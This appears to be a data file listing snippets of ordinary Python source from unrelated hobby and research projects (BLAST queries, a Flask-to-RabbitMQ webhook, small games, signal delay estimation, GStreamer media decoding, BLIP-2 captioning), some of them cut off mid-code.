    "# Homo sapiens chromosome 6, GRCh38.p14 Primary Assembly is used as an example\r\n# NCBI Reference Sequence: NC_000006.12\r\n# https://www.ncbi.nlm.nih.gov/nuccore/NC_000006.12?report=fasta&from=27866792&to=27867588&strand=true\r\n\r\n# 1. libraries and data import\r\nimport time\r\nimport datetime\r\nfrom Bio.Blast import NCBIWWW\r\nfrom Bio.Blast import NCBIXML\r\nfrom Bio import SeqIO\r\nimport os\r\n\r\n# 2. enter variables\r\nstart_time = time.time()\r\nend_time = time.time()\r\nNCBIWWW.email = '' # there should be an email here \r\n\r\n# 3. send a request to BLAST, write the result to an XML file\r\nwdir = os.getcwd()\r\nrecord = SeqIO.read(handle='sequence.fasta', format='fasta')\r\nrequest = NCBIWWW.qblast(\"blastn\", \"nt\", record.format(\"fasta\"))\r\n\r\nwith open('blast_result.xml', 'w+') as add_to:\r\n    add_to.write(request.read())\r\n    request.close()\r\n\r\n# 4. output the result and program execution time\r\nprint(f'Time used: {end_time - start_time}.')\r\n\r\nresult_handle = open('blast_result.xml', 'r')\r\nblast_record = NCBIXML.read(result_handle)\r\nE_VALUE_THRESH = 0.001\r\nfor alignment in blast_record.alignments:\r\n    for hsp in alignment.hsps:\r\n        if hsp.expect < E_VALUE_THRESH:\r\n            print('****Alignment****')\r\n            print('Sequence:', alignment.title)\r\n            print('Sequence length:', alignment.length)\r\n            print('E-value:', hsp.expect)\r\n            print(hsp.query[0:75] + '...')\r\n            print(hsp.match[0:75] + '...')\r\n            print(hsp.sbjct[0:75] + '...')\r\n\r\n\r\n# 5. copy XML request file to target_url repository\r\n\r\noriginal_file_path = '' # there should be the path to the original file\r\ncurrent_date = datetime.datetime.now() # current time and date\r\n\r\n# create a new filename based on the date and time\r\nnew_file_name = current_date.strftime('%Y-%m-%d_%H-%M-%S') + '.xml'\r\n\r\n# duplicate the file to the new location\r\nnew_file_path = os.path.join('C:\\\\', new_file_name) # there should be the destination directory path\r\nos.makedirs(os.path.dirname(new_file_path), exist_ok=True)\r\nwith open(original_file_path, 'rb') as original_file:\r\n    with open(new_file_path, 'wb') as new_file:\r\n        new_file.write(original_file.read())\r\n\r\n'''                   ! optional element !\r\nif __name__ == '__main__':\r\n    pass\r\n'''\r\n",
    "from flask import Flask, request, jsonify\r\nimport logging\r\nimport pika\r\nimport json\r\nimport os\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route('/webhook', methods=['POST'])\r\ndef webhook():\r\n    logging.info('Python HTTP trigger function processed a request.')\r\n\r\n    ok = True\r\n\r\n    # Connection parameters\r\n    rabbitmq_host = os.environ.get('RABBITMQ_HOST', \"host.docker.internal\")\r\n    rabbitmq_port = 5672\r\n    queue_name = \"webhook_q\"\r\n\r\n    # Establishing connection\r\n    connection = pika.BlockingConnection(pika.ConnectionParameters(host=rabbitmq_host, port=rabbitmq_port))\r\n    channel = connection.channel()\r\n    channel.queue_declare(queue=queue_name, durable=True)\r\n\r\n    try:\r\n        # Get the request body\r\n        data = request.get_json()\r\n        if not data:\r\n            raise ValueError(\"No json body passed in the request.\")\r\n        \r\n        # Convert data to JSON\r\n        json_data = json.dumps(data)\r\n        \r\n        # Publish the message to the queue\r\n        channel.basic_publish(exchange='', routing_key=queue_name, body=json_data)\r\n        print(f\"Sent '{json_data}' to {queue_name}\")\r\n    except Exception as e:\r\n        ok = False\r\n        # report error\r\n        print(\"An error occurred:\", e)\r\n        pass\r\n\r\n    if ok:\r\n        return jsonify({\"message\":\"Request processed successfully.\"}), 200\r\n    else:\r\n        return jsonify({\"message\":\"An error occurred while processing the request.\"}), 402\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='0.0.0.0', port=5000, debug=True)\r\n",
    "import random\r\nimport time\r\nimport sys\r\nimport json\r\n\r\n# Global variables # Global variables\r\n\r\nsave_file = 'bingo_game_state.txt'\r\nNumbers1 = []  # List to store numbers for the first table\r\nNumbers2 = []  # List to store numbers for the second table\r\nGame_Table1 = []\r\nGame_Table2 = []\r\nComputer = \"Computer\"\r\nTable_Numbers = []\r\ncount1 = 0\r\ncount2 = 0\r\ncount3 = 0\r\nresult1_str = \"\"\r\nresult2_str = \"\"\r\nresult3_str = \"\"\r\nUser_Name = \"\"\r\nCom_or_Friend = 0\r\ncontinuity = 'yes'\r\nfriend_name = \"\"\r\n\r\ndef save_game_state():\r\n    game_state = {\r\n        'User_Name': User_Name,\r\n        'Com_or_Friend': Com_or_Friend,\r\n        'friend_name': friend_name,\r\n        'count1': count1,\r\n        'count2': count2,\r\n        'count3': count3,\r\n        'result1_str': result1_str,\r\n        'result2_str': result2_str,\r\n        'result3_str': result3_str,\r\n        'Table_Numbers': Table_Numbers,\r\n        'Game_Table1': Game_Table1,\r\n        'Game_Table2': Game_Table2,\r\n        'Dimension': Dimension\r\n    }\r\n    for key, value in game_state.items():\r\n        if callable(value):\r\n            game_state[key] = str(value)\r\n\r\n    # Write the game state to the file\r\n    with open('bingo_game_state.txt', 'w') as f1:\r\n        f1.write(json.dumps(game_state))\r\n\r\ndef load_game_state():\r\n    try:\r\n        with open('bingo_game_state.txt', 'r') as f1:\r\n            game_state = json.loads(f1.read())\r\n            global User_Name, Com_or_Friend, count1, count2, count3, User_Result, Com_Result, friend_result_str, Table_Numbers, Game_Table1, Game_Table2, Game_Table3, Dimension, friend_name\r\n            User_Name = game_state.get('User_Name', '')\r\n            Com_or_Friend = game_state.get('Com_or_Friend', 0)\r\n            friend_name = game_state.get('friend_name', '')\r\n            count1 = game_state.get('count1', 0)\r\n            count2 = game_state.get('count2', 0)\r\n            count3 = game_state.get('count3', 0)\r\n            result1_str = game_state.get('result1_str', 0)\r\n            result2_str = game_state.get('result2_str', 0)\r\n            result3_str = game_state.get('result3_str', 0)\r\n            Table_Numbers = game_state.get('Table_Numbers', 0)\r\n            Game_Table1 = game_state.get('Game_Table1', 0)\r\n            Game_Table2 = game_state.get('Game_Table2', 0)\r\n            Dimension = game_state.get('Dimension', 0)\r\n            if (count1 or count2 or count3)>=5:\r\n                count1 = 0 \r\n\r\n            else:\r\n\r\n                # Load other important variables\r\n                print(\"Game state loaded successfully.\")\r\n                print(f\"Resuming game for {User_Name}\")\r\n                print(f\"{User_Name}'s Table:\")\r\n                print_table(Game_Table1)\r\n                Table1_is_bingo()\r\n                if Com_or_Friend == \"friend\":\r\n                    print(f\"{friend_name}'s Table:\")\r\n                    print_table(Game_Table2)\r\n                    Table3_is_bingo()\r\n                if Com_or_Friend == \"computer\":\r\n                    print(\"Computer's Table:\")\r\n                    print_table(Game_Table2)\r\n                    Table2_is_bingo()\r\n\r\n    except FileNotFoundError:\r\n        pass\r\n    return count3,count2,count1\r\n\r\ndef Number_Set(Numbers):\r\n    start = 0\r\n    for i in range(1, Dimension + 1):\r\n        for j in range(1, Dimension + 1):\r\n            start += 1\r\n            Numbers.append(start)\r\n\r\ndef Numbers():\r\n    Number_Set(Numbers1)\r\n    Number_Set(Numbers2)\r\n\r\ndef Table(Game_Table, Numbers, Name):\r\n    for i in range(Dimension):\r\n        Game_Table.append([])\r\n        for j in range(Dimension):\r\n            number = random.choice(Numbers)\r\n            Game_Table[i].append(number)\r\n            Numbers.remove(number)\r\n    print(f\"{Name}'s Table:\")\r\n    for i in range(len(Game_Table)):\r\n        print(\" \".join(str(num).rjust(4) for num in Game_Table[i]))\r\n    return Game_Table\r\n\r\ndef Game_Numbers():\r\n    start = 0\r\n    for i in range(1, Dimension + 1):\r\n        for j in range(1, Dimension + 1):\r\n            start += 1\r\n            Table_Numbers.append(start)\r\n\r\n\r\ndef Change_num_to_x_in_both_tables(first_Game_Table, second_Game_Table, number):\r\n    for i in range(len(first_Game_Table)):\r\n        for j in range(len(first_Game_Table)):\r\n            if first_Game_Table[i][j] == number:\r\n                first_Game_Table[i][j] = \"x\"\r\n    for i in range(len(second_Game_Table)):\r\n        for j in range(len(second_Game_Table)):\r\n            if second_Game_Table[i][j] == number:\r\n                second_Game_Table[i][j] = \"x\"\r\n\r\n\r\ndef exiting():\r\n    print('exiting....')\r\n    time.sleep(1)\r\n    sys.exit(1)\r\n\r\ndef restart():\r\n    time.sleep(1)\r\n    main()\r\n\r\n\r\n\r\n# Change a user-selected number to 'x' in the tables\r\ndef Change_user_num_to_x():\r\n    # Asks the user to enter a number\r\n    while True:\r\n        user_input = input(\"Enter your number...\")\r\n        if user_input.lower() == \"exit\":\r\n            exiting()\r\n        elif user_input.lower()==\"restart\":\r\n            restart()\r\n        else:\r\n            try:\r\n         ",
    "import random\r\n\r\nhands = ['rock', 'scissors', 'paper']\r\nresults = {'win': 'you win', 'lose': 'you lose', 'draw': 'draw try again'}\r\n\r\ndef start_message():\r\n    print('Start \\'rock-paper-scissors\\'')\r\n\r\ndef get_player():\r\n    print('Input your hand')\r\n    input_message = ''\r\n    index = 0\r\n    for hand in hands:\r\n        input_message += str(index) + ':' + hand\r\n        if index < 2:\r\n            input_message += ', '\r\n        index += 1\r\n    return int(input(input_message))\r\n\r\n\r\ndef get_computer():\r\n    return random.randint(0, 2)\r\n\r\ndef get_hand_name(hand_number):\r\n    return hands[hand_number]\r\n\r\ndef view_hand(your_hand, computer_hand):\r\n    print('My hand is ' + get_hand_name(your_hand))\r\n    print('Computer\\'s hand is ' + get_hand_name(computer_hand))\r\n    \r\n\r\ndef get_result(hand_diff):\r\n    if hand_diff == 0:\r\n        return 'draw'\r\n    elif hand_diff == -1 or hand_diff == 2:\r\n        return 'win'\r\n    else:\r\n        return 'lose'\r\n\r\ndef view_result(result):\r\n    print(results[result])\r\n\r\ndef play():\r\n    your_hand = get_player()\r\n    computer_hand = get_computer()\r\n    hand_diff = (your_hand - computer_hand) % 3\r\n\r\n    view_hand(your_hand, computer_hand)\r\n    result = get_result(hand_diff)\r\n    view_result(result)\r\n\r\n    if result == 'draw':\r\n        print()\r\n        play()\r\n\r\nstart_message()\r\nplay()\r\n\r\n\r\n",
    "from kivy.uix.widget import Widget\nfrom kivy.properties import NumericProperty, ReferenceListProperty, ObjectProperty\nfrom kivy.vector import Vector\nfrom kivy.clock import Clock\nimport random\nfrom kivy.uix.label import Label\n\n\n\n\nclass PongPaddle(Widget):\n    score = NumericProperty(0)\n    \n\n\n    def bounce_ball(self, ball):\n        if self.collide_widget(ball):\n            vx, vy = ball.velocity\n            offset = (ball.center_y - self.center_y) / (self.height / 2)\n            bounced = Vector(-1 * vx, vy)\n            vel = bounced * 1.1\n            ball.velocity = vel.x, vel.y + offset\n\n\nclass PongBall(Widget):\n    velocity_x = 0\n    velocity_y = 0\n    velocity = ObjectProperty(Vector(0, 0))\n\n    def move(self):\n        self.pos = Vector(*self.velocity) + self.pos\n\n\n\nclass PongGame(Widget):\n    ball = ObjectProperty(None)\n    player1 = ObjectProperty(None)\n    player2 = ObjectProperty(None)\n    \n\n    def serve_ball(self):\n        self.ball.center = (540,1300)\n        list = [0, 180]\n        ballValLoc = random.choice(list)    \n        self.ball.velocity = Vector(10, 0).rotate(ballValLoc)\n\n    def update(self, dt):\n        self.ball.move()\n        \n        self.player1.bounce_ball(self.ball)\n        self.player2.bounce_ball(self.ball)\n\n        if (self.ball.y < 0) or (self.ball.top > self.height):\n            self.ball.velocity_y *= -1\n\n        if self.ball.x < self.x:\n            self.player2.score += 1\n            self.serve_ball()\n            \n                \n        if self.ball.x > self.width:\n            self.player1.score += 1\n            self.serve_ball()\n\n    def on_touch_move(self, touch):\n        if touch.x < self.width / 3:\n            self.player1.center_y = touch.y\n        if touch.x > self.width - self.width / 3:\n            self.player2.center_y = touch.y\n\n    def pause_game(self):\n        Clock.unschedule(self.update)\n        \n\n           \n            \n        ",
    "\"\"\"Contains a series of functions directed at calculating the delay between two arrays.\n* find_delay finds the delay between two time series using cross-correlation.\n* find_delays does the same, but for multiple excerpts from one big time series.\n\nAuthor: Romain Pastureau, BCBL (Basque Center on Cognition, Brain and Language)\nCurrent version: 1.3 (2024-04-18)\n\nVersion history\n---------------\n1.3 (2024-04-18) \u00b7 Removed unused function `_get_number_of_windows`\n1.2 (2024-04-17) \u00b7 Added transparency of the second (orange) array on the graph overlay\n                 \u00b7 Clarified README.md and added figures\n1.1 (2024-04-16) \u00b7 Added `find_delays`\n                 \u00b7 Created _create_figure containing all the plotting-related code\n                 \u00b7 Modified the graph plot when the max correlation is below threshold\n                 \u00b7 Minor corrections in docstrings\n1.0 (2024-04-12) \u00b7 Initial release\n\"\"\"\n\nfrom matplotlib import pyplot as plt\nfrom scipy.interpolate import CubicSpline, PchipInterpolator, Akima1DInterpolator, interp1d\nfrom scipy.io import wavfile\nfrom scipy.signal import butter, correlate, hilbert, lfilter\nimport numpy as np\nimport datetime as dt\n\n\ndef _filter_frequencies(array, frequency, filter_below=None, filter_over=None, verbosity=1):\n    \"\"\"Applies a low-pass, high-pass or band-pass filter to the data in the attribute :attr:`samples`.\n\n    Parameters\n    ----------\n    array: list or np.ndarray\n        An array of samples.\n\n    frequency: int or float\n        The sampling frequency of the array, in Hz.\n\n    filter_below: float or None, optional\n    \tThe value below which you want to filter the data. If set on None or 0, this parameter will be ignored.\n    \tIf this parameter is the only one provided, a high-pass filter will be applied to the samples; if\n    \t``filter_over`` is also provided, a band-pass filter will be applied to the samples.\n\n    filter_over: float or None, optional\n    \tThe value over which you want to filter the data. If set on None or 0, this parameter will be ignored.\n    \tIf this parameter is the only one provided, a low-pass filter will be applied to the samples; if\n    \t``filter_below`` is also provided, a band-pass filter will be applied to the samples.\n\n    verbosity: int, optional\n    \tSets how much feedback the code will provide in the console output:\n\n    \t\u2022 *0: Silent mode.* The code won\u2019t provide any feedback, apart from error messages.\n    \t\u2022 *1: Normal mode* (default). The code will provide essential feedback such as progression markers and\n    \t  current steps.\n    \t\u2022 *2: Chatty mode.* The code will provide all possible information on the events happening. Note that this\n    \t  may clutter the output and slow down the execution.\n\n    Returns\n    -------\n    np.array\n    \tThe array with filtered values.\n    \"\"\"\n\n    # Band-pass filter\n    if filter_below not in [None, 0] and filter_over not in [None, 0]:\n        if verbosity > 0:\n            print(\"\\tApplying a band-pass filter for frequencies between \" + str(filter_below) + \" and \" +\n                  str(filter_over) + \" Hz.\")\n        b, a = butter(2, [filter_below, filter_over], \"band\", fs=frequency)\n        filtered_array = lfilter(b, a, array)\n\n    # High-pass filter\n    elif filter_below not in [None, 0]:\n        if verbosity > 0:\n            print(\"\\tApplying a high-pass filter for frequencies over \" + str(filter_below) + \" Hz.\")\n        b, a = butter(2, filter_below, \"high\", fs=frequency)\n        filtered_array = lfilter(b, a, array)\n\n    # Low-pass filter\n    elif filter_over not in [None, 0]:\n        if verbosity > 0:\n            print(\"\\tApplying a low-pass filter for frequencies below \" + str(filter_over) + \" Hz.\")\n        b, a = butter(2, filter_over, \"low\", fs=frequency)\n        filtered_array = lfilter(b, a, array)\n\n    else:\n        filtered_array = array\n\n    return filtered_array\n\n\ndef _get_window_length(array_length_or_array, number_of_windows, overlap_ratio):\n    \"\"\"Given an array to be split in a given overlapping number of windows, calculates the number of elements in each\n    window.\n\n    Parameters\n    ----------\n    array_length_or_array: list, np.ndarray or int\n        An array of numerical values, or its length.\n    number_of_windows: int\n        The number of windows to split the array in.\n    overlap_ratio: float\n        The ratio of overlapping elements between each window.\n\n    Returns\n    -------\n    int\n        The number of elements in each window. Note: the last window may have fewer elements than the others if the\n        number of windows does not divide the result of :math:`array_length + (number_of_windows - 1) \u00d7 overlap`.\n    \"\"\"\n\n    if not isinstance(array_length_or_array, int):\n        array_length = len(array_length_or_array)\n    else:\n        array_length = array_length_or_array\n\n    if overlap_ratio >= 1 or overlap_ratio < 0:\n        raise Exception(\"The size of the overlap ratio (\" + str(overlap_ratio) + \") must be superior or equal to 0, \" +\n                        \"and",
    "import asyncio\nimport logging\n\nfrom dailyai.pipeline.frames import (Frame, AudioFrame, ImageFrame)\nfrom dailyai.pipeline.frame_processor import FrameProcessor\n\nfrom typing import AsyncGenerator\n\ntry:\n    import gi\n    gi.require_version('Gst', '1.0')\n    gi.require_version('GstApp', '1.0')\n    from gi.repository import Gst, GstApp, GLib\nexcept ModuleNotFoundError as e:\n    print(f\"Exception: {e}\")\n    print(\n        \"In order to use the GStreamer Daily transport, you need to install GStreamer`.\")\n    raise Exception(f\"Missing module: {e}\")\n\nVIDEO_WIDTH = 1024\nVIDEO_HEIGHT = 576\nAUDIO_SAMPLE_RATE = 16000\nAUDIO_CHANNELS = 1\n\n\nclass GStreamerFileSource(FrameProcessor):\n    def __init__(self, filename: str, sink_queue, loop, **kwargs):\n        super().__init__(**kwargs)\n\n        Gst.init()\n\n        self._loop = loop\n        self._sink_queue = sink_queue\n        self._logger: logging.Logger = logging.getLogger(\"dailyai\")\n\n        self._player = Gst.Pipeline.new(\"player\")\n\n        source = Gst.ElementFactory.make(\"filesrc\", None)\n        source.set_property(\"location\", filename)\n\n        decodebin = Gst.ElementFactory.make(\"decodebin\", None)\n        decodebin.connect(\"pad-added\", self._decodebin_callback)\n\n        self._player.add(source)\n        self._player.add(decodebin)\n        source.link(decodebin)\n\n        bus = self._player.get_bus()\n        bus.add_signal_watch()\n        bus.connect(\"message\", self._on_gstreamer_message)\n\n    async def process_frame(self, frame: Frame) -> AsyncGenerator[Frame, None]:\n        yield frame\n\n    def start(self):\n        self._player.set_state(Gst.State.PLAYING)\n\n    def _on_gstreamer_message(self, bus, message):\n        t = message.type\n        if t == Gst.MessageType.ERROR:\n            err, debug = message.parse_error()\n            self._logger.error(f\"Error: {err} : {debug}\")\n        return True\n\n    def _decodebin_callback(self, decodebin, pad):\n        caps_string = pad.get_current_caps().to_string()\n        if caps_string.startswith(\"audio\"):\n            self._decodebin_audio(pad)\n        elif caps_string.startswith(\"video\"):\n            self._decodebin_video(pad)\n\n    def _decodebin_audio(self, pad):\n        queue_audio = Gst.ElementFactory.make(\"queue\", None)\n        audioconvert = Gst.ElementFactory.make(\"audioconvert\", None)\n        audioresample = Gst.ElementFactory.make(\"audioresample\", None)\n        audiocapsfilter = Gst.ElementFactory.make(\"capsfilter\", None)\n        audiocaps = Gst.Caps.from_string(\n            f\"audio/x-raw,format=S16LE,rate={AUDIO_SAMPLE_RATE},channels={AUDIO_CHANNELS},layout=interleaved\")\n        audiocapsfilter.set_property(\"caps\", audiocaps)\n        appsink_audio = Gst.ElementFactory.make(\"appsink\", None)\n        appsink_audio.set_property(\"emit-signals\", True)\n        appsink_audio.connect(\"new-sample\", self._appsink_audio_new_sample)\n\n        self._player.add(queue_audio)\n        self._player.add(audioconvert)\n        self._player.add(audioresample)\n        self._player.add(audiocapsfilter)\n        self._player.add(appsink_audio)\n        queue_audio.sync_state_with_parent()\n        audioconvert.sync_state_with_parent()\n        audioresample.sync_state_with_parent()\n        audiocapsfilter.sync_state_with_parent()\n        appsink_audio.sync_state_with_parent()\n\n        queue_audio.link(audioconvert)\n        audioconvert.link(audioresample)\n        audioresample.link(audiocapsfilter)\n        audiocapsfilter.link(appsink_audio)\n\n        queue_pad = queue_audio.get_static_pad(\"sink\")\n        pad.link(queue_pad)\n\n    def _decodebin_video(self, pad):\n        queue_video = Gst.ElementFactory.make(\"queue\", None)\n        videoconvert = Gst.ElementFactory.make(\"videoconvert\", None)\n        videoscale = Gst.ElementFactory.make(\"videoscale\", None)\n        videocapsfilter = Gst.ElementFactory.make(\"capsfilter\", None)\n        videocaps = Gst.Caps.from_string(\n            f\"video/x-raw,format=RGB,width={VIDEO_WIDTH},height={VIDEO_HEIGHT}\")\n        videocapsfilter.set_property(\"caps\", videocaps)\n\n        appsink_video = Gst.ElementFactory.make(\"appsink\", None)\n        appsink_video.set_property(\"emit-signals\", True)\n        appsink_video.connect(\"new-sample\", self._appsink_video_new_sample)\n\n        self._player.add(queue_video)\n        self._player.add(videoconvert)\n        self._player.add(videoscale)\n        self._player.add(videocapsfilter)\n        self._player.add(appsink_video)\n        queue_video.sync_state_with_parent()\n        videoconvert.sync_state_with_parent()\n        videoscale.sync_state_with_parent()\n        videocapsfilter.sync_state_with_parent()\n        appsink_video.sync_state_with_parent()\n\n        queue_video.link(videoconvert)\n        videoconvert.link(videoscale)\n        videoscale.link(videocapsfilter)\n        videocapsfilter.link(appsink_video)\n\n        queue_pad = queue_video.get_static_pad(\"sink\")\n        pad.link(queue_pad)\n\n    def _appsink_audio_new_sample(self, appsink):\n        buffer = appsink.pull_sample().get_buffer()",
    "def contar_letras(texto):\n    contador = {}\n    for letra in texto:\n        if letra in contador:\n            contador[letra] += 1\n        else:\n            contador[letra] = 1\n    return contador\n\ndef puede_formar_palabra(palabra, dicc_letras):\n    dicc_letras_actual = contar_letras(palabra)\n    for letra, cantidad in dicc_letras_actual.items():\n        if cantidad > dicc_letras.get(letra, 0):\n            return False\n    return True\n\ndef encontrar_palabra_maxima(letras, palabras):\n    dicc_letras = contar_letras(letras)\n    mejor_palabra = \"\"\n\n    for palabra in palabras:\n        if puede_formar_palabra(palabra, dicc_letras):\n            # Seleccionar la palabra m\u00e1s larga o en orden lexicogr\u00e1fico si tienen el mismo tama\u00f1o\n            if len(palabra) > len(mejor_palabra) or (len(palabra) == len(mejor_palabra) and palabra < mejor_palabra):\n                mejor_palabra = palabra\n\n    return mejor_palabra if mejor_palabra else \"No es posible\"\n\nletras_entrada = input()\nnum_palabras = int(input())\npalabras_entrada = [input().strip() for _ in range(num_palabras)]\n\nresultado = encontrar_palabra_maxima(letras_entrada, palabras_entrada)\nprint(resultado)",
    "import torch\nfrom transformers import Blip2Processor, Blip2ForConditionalGeneration\n\nimport requests\nfrom PIL import Image\nimport pandas as pd\n\nBLIP2DICT = {\n    \"FlanT5 XXL\": \"Salesforce/blip2-flan-t5-xxl\",\n    \"FlanT5 XL COCO\": \"Salesforce/blip2-flan-t5-xl-coco\",\n    \"OPT6.7B COCO\": \"Salesforce/blip2-opt-6.7b-coco\",\n    \"OPT2.7B COCO\": \"Salesforce/blip2-opt-2.7b-coco\",\n    \"FlanT5 XL\": \"Salesforce/blip2-flan-t5-xl\",\n    \"OPT6.7B\": \"Salesforce/blip2-opt-6.7b\",\n    \"OPT2.7B\": \"Salesforce/blip2-opt-2.7b\",\n}\n\n\nclass Blip2:\n    def __init__(self, model, device_id, bit8=True):\n        # load BLIP-2 to a single gpu\n        self.tag = model\n        self.bit8 = bit8\n        self.device = \"cuda:{}\".format(device_id)\n\n        dtype = {\"load_in_8bit\": True} if self.bit8 else {\"torch_dtype\": torch.float16}\n        self.blip2_processor = Blip2Processor.from_pretrained(BLIP2DICT[self.tag])\n        self.blip2 = Blip2ForConditionalGeneration.from_pretrained(\n            BLIP2DICT[self.tag], device_map={\"\": device_id}, **dtype\n        )\n\n    def ask(self, raw_image, question):\n        inputs = self.blip2_processor(raw_image, question, return_tensors=\"pt\").to(self.device, torch.float16)\n        out = self.blip2.generate(**inputs)\n        answer = self.blip2_processor.decode(out[0], skip_special_tokens=True)\n        return answer\n\n    def caption(self, raw_image):\n        # starndard way to caption an image in the blip2 paper\n        caption = self.ask(raw_image, \"a photo of\")\n        caption = caption.replace(\"\\n\", \" \").strip()  # trim caption\n        return caption\n\n    def call_llm(self, prompts):\n        prompts_temp = self.blip2_processor(None, prompts, return_tensors=\"pt\")\n        input_ids = prompts_temp[\"input_ids\"].to(self.device)\n        attention_mask = prompts_temp[\"attention_mask\"].to(self.device, torch.float16)\n\n        prompts_embeds = self.blip2.language_model.get_input_embeddings()(input_ids)\n\n        outputs = self.blip2.language_model.generate(inputs_embeds=prompts_embeds, attention_mask=attention_mask)\n\n        outputs = self.blip2_processor.decode(outputs[0], skip_special_tokens=True)\n\n        return outputs\n\n\nif __name__ == \"__main__\":\n    # Load data from a csv file\n    data_path = \"path/to/data\"\n    df = pd.read_csv(f\"{data_path}/predict_this_img.csv\")\n\n    # Initialize the model\n    blib2_model = Blip2(model=\"OPT2.7B COCO\", device_id=0)\n\n    # Generate captions for each image\n    all_captions = []\n    for idx, row in df.iterrows():\n        print(idx)\n        raw_image = Image.open(requests.get(row[\"coco_url\"], stream=True).raw).convert(\"RGB\")\n        result = blib2_model.caption(raw_image=raw_image)\n        all_captions.append(result)\n\n    # Save the captions to a csv file\n    df[\"caption\"] = all_captions\n    df = df[[\"id\", \"caption\"]].rename(columns={\"id\": \"image_id\"}).copy()\n    df.to_csv(f\"{data_path}/submission.csv\", index=False)\n",
    "int_number = 1\nfloat_number = 1.1\n\nint_number_a = 2\nint_number_b = 5\nint_number_c = int_number_a + int_number_b\nint_number_d = int_number_b - int_number_a\nint_number_e = int_number_a * int_number_b\nint_number_f = int_number_a ** int_number_b  # 2 to the power of 5\nfloat_number_g = int_number_b / int_number_a\nint_number_h = int_number_b // int_number_a  # floor division discards the fractional part\nint_number_i = (1 + int_number_a) * int_number_b\n\nprint(\"int_number: \" + str(int_number))\nprint(\"float_number: \" + str(float_number))\nprint(\"int_number_a: \" + str(int_number_a))\nprint(\"int_number_b: \" + str(int_number_b))\nprint(\"int_number_c = int_number_a + int_number_b: \" + str(int_number_c))\nprint(\"int_number_d = int_number_b - int_number_a: \" + str(int_number_d))\nprint(\"int_number_e = int_number_a * int_number_b: \" + str(int_number_e))\nprint(\"int_number_f = int_number_a ** int_number_b: \" + str(int_number_f))\nprint(\"float_number_g = int_number_b / int_number_a: \" + str(float_number_g))\nprint(\"int_number_h = int_number_b // int_number_a: \" + str(int_number_h))\nprint(\"int_number_i = (1 + int_number_a) * int_number_b: \" + str(int_number_i))\n\n'''\nThis is output result\n\nint_number: 1\nfloat_number: 1.1\nint_number_a: 2\nint_number_b: 5\nint_number_c = int_number_a + int_number_b: 7\nint_number_d = int_number_b - int_number_a: 3\nint_number_e = int_number_a * int_number_b: 10\nint_number_f = int_number_a ** int_number_b: 32\nint_number_g = int_number_b / int_number_a: 2.5\nint_number_h = int_number_b // int_number_a: 2\nint_number_i = (1 + int_number_a) * int_number_b: 15\n'''\n",
    "import random\ntop20, playerlista, playerlistb, playerlistc, playerlistd = [], [], [], [], []\n\nlist_dict = {'a': playerlista, 'b': playerlistb, 'c': playerlistc, 'd': playerlistd, 'top20': top20}\n\nnewline = \"\\n\"\n\nranked_players = set()  # Initialize an empty set to store ranked players\n\ndef handlelistmovement():\n    whattier = input(\"What tier do you want to move people around in: \")\n\n    if whattier == 'a':\n        listrankingsoverall()\n        whatplayer = input(\"Which player do you want to move: \")\n        new_index = int(input(\"Enter the new index for the player: \"))\n        new_index = new_index-1\n\n        if whatplayer in playerlista:\n            # Find the current index of the player\n            current_index = playerlista.index(whatplayer)\n            \n            # Remove the player from the list\n            playerlista.remove(whatplayer)\n            \n            # Insert the player at the new index\n            playerlista.insert(new_index, whatplayer)\n\n            print(f\"{whatplayer} moved to index {new_index+1} in the list.\")\n        else:\n            print(\"Player not found in the list.\")\n\n\n\ndef rankingplayers():\n    \n    with open(\"icers.txt\", \"r\") as readfile:\n        for currentplayer in readfile:\n            currentplayer = currentplayer.strip()\n            \n            if currentplayer in ranked_players:\n                continue  # Skip this player\n        \n            rankbyranker = input(f\"Where do you rank the player '{currentplayer}'? \")\n            \n            if rankbyranker.lower() == 'a':\n                playerlista.append(currentplayer)\n            elif rankbyranker.lower() == 'b':\n                playerlistb.append(currentplayer)\n            elif rankbyranker.lower() == 'c':\n                playerlistc.append(currentplayer)\n            elif rankbyranker.lower() == 'd':\n                playerlistd.append(currentplayer)\n            elif rankbyranker.lower() == 'top20':\n                top20.append(currentplayer)\n\n            ranked_players.add(currentplayer) #set to keep track of previously ranked players\n            # Prompt user to continue or stop ranking\n            userinput = input(f\"{newline}(enter back to get back the console){newline}\")\n\n            if userinput.lower() == 'back':\n                    break\n\ndef myprivateconsole():\n    commands = [\"playerlist\",\n                \"rankingplayers\",\n                \"quit\",\n                \"printlist\",\n                \"deleteplayerfromtier\",\n                \"shufflelist\",\n                \"movelistplacement\"] #printlist prints to ranking output.txt\n    while True:\n        userinput2 = input(f\"Enter 'help' for a list of all commands: \")\n        if userinput2.lower() == 'help':\n            print(f\"{newline}{commands}{newline}\")\n        elif userinput2.lower() == 'playerlist':\n            # Call the function to list rankings across all categories\n            listrankingsoverall()\n        elif userinput2.lower() == 'rankingplayers':\n            rankingplayers()\n        elif userinput2.lower() == 'quit':\n            exit()\n        elif userinput2.lower() == 'printlist':\n            printrankings()\n        elif userinput2.lower() == 'shufflelist':\n            shuffleplayers()\n        elif userinput2.lower() == 'movelistplacement':\n            handlelistmovement()\n        elif userinput2.lower() == 'deleteplayerfromtier':\n            checkingdeleteinput = input(f\"{newline}Enter the tier u want to delete the player from: {newline}\")\n            playerdeleteinput = input(f\"{newline}From the current tier what player do you want to delete: {newline}\")\n            deleteplayerfromlist(checkingdeleteinput,playerdeleteinput)\n        else:\n            print(f\"{newline}Invalid command. Enter 'help' for a list of all commands.{newline}\")\n       \n\ndef printrankings():\n    with open(\"ranking_output.txt\", \"w\") as outfile:\n        outfile.write(f\"=== Final Rankings ==={newline}{newline}\")\n        for key, value in list_dict.items():\n            outfile.write(f\"Player List {key.upper()}:{newline}\")\n            if value:\n                for idx, player in enumerate(value, start=1):\n                    outfile.write(f\"{idx}. {player}{newline}\")\n            else:\n                outfile.write(f\"No players ranked in this category.{newline}\")\n\ndef listrankingsoverall():\n    # Display current rankings across all categories\n    print(f\"{newline}=== Current Rankings ==={newline}{newline}\")\n    for key, value in list_dict.items():\n        print(f\"Player List {key.upper()}:\")\n        if value:\n            for idx, player in enumerate(value, start=1):\n                print(f\"{idx}. {player}\")\n        else:\n            print(\"No players ranked in this category.\")\n\n\ndef deleteplayerfromlist(checkingdeleteinput, playerdeleteinput):\n    removedplayers = []\n    try:\n        if checkingdeleteinput == 'a':\n            playerlista.remove(playerdeleteinput)\n        elif checkingdeleteinput == 'b':\n            playerlistb.remove(playerdeleteinput)\n        elif checkingdele",
